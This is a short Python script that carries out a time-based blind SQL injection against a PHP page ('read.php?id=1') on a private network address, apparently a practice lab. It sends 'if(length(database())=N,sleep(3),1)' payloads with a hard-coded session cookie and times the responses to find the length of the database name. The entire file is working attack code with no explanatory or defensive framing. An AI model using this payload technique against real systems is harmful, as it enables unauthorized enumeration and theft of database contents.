import time

import requests

for len in range(1,50):
    header={"Cookie":"PHPSESSID=ef921678cfa3055a5f95c69a9818493b"}
    url=f"http://192.168.2.128/Security/read.php?id=1 and if(length(database())={len},sleep(3),1)"
    start = time.time()
    resp = requests.get(url=url,headers=header)
    end = time.time()
    resptime = end-start
    if int(resptime)>=3:
        print(len)
        break

